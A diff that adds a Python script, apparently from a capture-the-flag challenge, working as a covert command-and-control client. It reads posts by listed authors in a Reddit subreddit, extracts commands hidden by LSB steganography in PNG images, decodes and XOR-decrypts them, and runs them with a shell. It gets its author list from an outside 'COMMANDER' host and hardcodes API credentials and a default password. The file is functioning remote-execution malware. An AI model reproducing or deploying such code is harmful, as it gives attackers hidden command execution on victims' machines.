@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+import praw, requests, os, subprocess, base64
+from stegano import lsb
+
+client_id = "g2Vo2btbIDKUmw" 
+client_secret = "9gRk2Zcx8bh6TcRO6038A_495JyLmg" 
+user_agent = "CSCG Controller"
+authorized_authors = {}
+
+def sxor(encode_string, key):
+    if len(encode_string) > len(key) and len(key) > 0:
+        key = key*(int(len(encode_string)/len(key))+1)
+    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(encode_string,key))
+
+try:
+    ip = os.getenv('COMMANDER', "127.0.0.1")
+    authors = requests.get("http://" + ip +":1024/reddit").content.decode().split("|")
+except:
+    authors = []
+    
+if len(authors) <= 1:
+    authorized_authors["CSCG_Controller"] = "s3cr3t_P4ssw0rd"
+else:
+    for author in authors:
+        name, password = author.split(":")
+        authorized_authors[name] = password
+
+reddit = praw.Reddit(client_id = client_id,  
+                     client_secret = client_secret, 
+                     user_agent = user_agent)
+
+for submission in reddit.subreddit("test").new():
+    if submission.author and submission.author.name in authorized_authors:
+        link = submission.url
+        data = requests.get(link)
+        if "image/png" == data.headers["content-type"]:
+            io = open("command.png","wb")
+            io.write(data.content)
+            io.close()
+            command_to_execute = lsb.reveal("./command.png")
+            command_to_execute = sxor(base64.b64decode(command_to_execute).decode(),authorized_authors[submission.author.name])
+            os.remove("command.png")
+            subprocess.check_output(command_to_execute, shell=True, timeout=2)
